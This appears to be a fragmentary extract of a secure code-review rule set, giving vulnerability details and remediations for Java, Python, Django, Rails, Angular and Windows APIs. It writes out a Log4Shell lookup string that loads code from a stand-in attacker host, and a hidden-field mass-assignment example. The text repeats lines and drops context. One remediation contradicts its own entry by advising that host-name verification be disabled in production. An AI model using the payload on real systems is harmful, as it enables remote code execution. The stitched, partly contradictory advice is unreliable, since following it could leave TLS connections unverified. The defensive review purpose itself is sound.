Details: In all server side regex implementations using backtracking NFA.
Remediation: Use a better regex, without repeated group expressions with repetitions (like ^(\d+)*$). Or use another implementation (e.g. RE2) or set maximum computation time.

Details: No secret info , no application state or js calculation (source code can be viewed/changed); should be done server side.

Remediation: Add headers like 'X-Content-Type-Options(nosniff)', Content-Security-Policy(default-src https://cdn.example.net; child-src 'none'; object-src 'none')', 'Strict-Transport-Security(max-age=31536000'), 'X-Frame-Options(sameorigin)'

CWE284. If checkCallingOrSelf(Uri)Permission() methods are used in Inter-Process Communication (IPC), this can be exploited by malicious software to elevate privelige.

Details: MD5, SHA1, DSA, RSA keySize < 2048. "From Java 7 onwards cipher suites can be excluded from use via a security policy file called java.security that is located under Java Runtime Environment in the /lib/security directory."

Set whether or not JSEE should omit checking if the host name specified in the URL matches that of the Common Name (CN) on the server's certificate. Default is false; this attribute should not be set to true during production use.
Remediation: Set to true in prd environment.

Details: Spring4Shell. Arbitrary code execution; java.lang.ClassLoader.defineClass, java.net.URLClassLoader

If user input is logged, remote code execution may be possible on the log server with the rights of the app. An attacker may inject "jndi:ldap://www.attacker.com/malicious_java_class". This lands within ${..} and the log4j lookup feature will execute the java class on the remote attacker site.

Remediation: If whitelisting is not possible, validate on length (if possible < 15), format and/or allowed characters (e.g via regex).

Details: Race condition format flaw; java.Text.Format and SimpleDateFormat method parse() are not thread-safe.
Remediation: Use DateTimeFormatter (from Java 8) instead of SimpleDateFormat

Details: Untrusted user input, e.g. via parameters.

Remediation: Check external user defined parameters. Override ObjectInputStream#resolveClass()  to prevent deserializing arbitrary classes. Use e.g. SerialKiller library.

Details: Serialization vulnerability (only if ReadObject() is used).
Remediation: Make readObject() final. Or override ObjectInputStream#resolveClass()  to prevent deserializing arbitrary classes. Use e.g. SerialKiller library.
override ObjectInputStream#resolveClass()  to prevent deserializing arbitrary classes. Use e.g. SerialKiller library.

Details: Race condition format flow; *Format classes use .format() and are not thread-safe.
Remediation: Use DateTimeFormatter (from Java 8) instead of SimpleDateFormat

Details: In android, with getText() and setText() you can manipulate user input (Edittext) via an Editable.
Swagger Scopes should be defined (except "read-the-docs"). See settings.py.

Remediation: Authorization: Make sure user is owner of file

Details: Python modules SSL and pyOpenSSL do not validate server identity.
Remediation: In the code, retrieve X509. The subject common name (CN), should be equal to the host name.

Details: Can it contain untrusted user input.
Remediation: Use JSON serialization or add a digital signature.

Details: shelve.open() opens a shelf, which is ako dictionary (may be class, anything pickle can handle) . Uses pickle, see pickle.
Can it contain untrusted user input.
Can it contain untrusted user input. Joblib uses pickle.
Can it contain untrusted user input.
Can it contain untrusted user input? In combination with subprocess.call(command, shell=True)
Remediation: Escape vairables with pipes.qoute() (2.x) or  shlex.quote() (>3.3)
Escape querystring parameters and do not quote placeholders.

Details: Are strings marked as safe that can be user-influenced?
[*] is over-permissive. Vulnerable when get_host() is used. Security is bypassed when request.META is used.
Disables Django ALLOWED_HOST security if HOST is retrieved from META instead of get_host()

Remediation: Use the default Verify=True or pass certificate path.

Details: Default must be present to avoid crash. Only a risk if attribute name is user-influenced.
Sentry setting, when True (default is False), pii is not being filtered out.
Remediation: Remove the parameter or put it to False.

Details: Mass assignment issue in older versions. E.g. In form attacker adds  <input type="hidden" name="is_admin" value="true">.
Should be present in older versions. "Strong parameters" issue .
Is a remedy against redirection to malicious sites.
link_to is a href tag, vulnerable in older versions.
Remediation: CSP. This forbids links starting with" javascript:"

Details: Default by cookies, that do not terminate session. Database is recommended for storage of  session id.

Remediation: Use of token authorization only protects against CSRF.
Authorization: Make sure user is owner of file
Use safe interchange format like JSON

Details: Jwt.decode() does not verify the signature.
Local and - less easily- Sessionstorage can be read by an attacker.
Remediation: Encrypt sensitive data. E.g. Using npm encrypt-storage.

Details: Check if query parameters are validated/sanitized
Should normally be set to httpOnly and Secure
Privacy may be violated. The disclosure of session ID's may enable an attacker to take over user sessions.
Remediation: Encrypt sensitive information or implement environment dependent logging of  sensitive information, ensure it is turned off by default.

Details: window.open vulnerability, without setting myNwWdw.opener = null afterwards.
Avoid user-coontrolled data to be dynamically written to the HTML document.
window.open vulnerability, when using target="_blank" without rel="noopener noreferrer"
sce = Angular's Strict Contextual Auto Escaping. Circumvents Angular XSS protection when specifying "$sce.enabled(false)".
Remediation: Use "ng-bind-html=…" in the view and import "ngSanitize" in the angular.module.

Details: "angular.element(…).html(userInput)". jqLite api's circumvent Angular XSS auto-escape protection.
Remediation: Use "ng-bind-html=…" in the view and import "ngSanitize" in the angular.module.
Use "ng-bind-html=…" in the view and import "ngSanitize" in the angular.module.

Details: "escapeForHtml(userInput)". This is a DIY that may circumvents Angular XSS auto-escape protection.
Remediation: Use "ng-bind-html=…" in the view and import "ngSanitize" in the angular.module.

Details: banned: IsBadWritePtr, IsBadHugeWritePtr, IsBadReadPtr, IsBadHugeReadPtr, IsBadCodePtr, IsBadStringPtr. As bad as catching all exceptions.
banned: CharToOem, CharToOemA, CharToOemW, CharToOemBuffA, CharToOemBuffW

Remediation: Generally, disable DTD (External Entities). E.g. via "SaxParserFactory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)" or "SaxParserFactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);"
Avoid deserializing objects provided by end users.
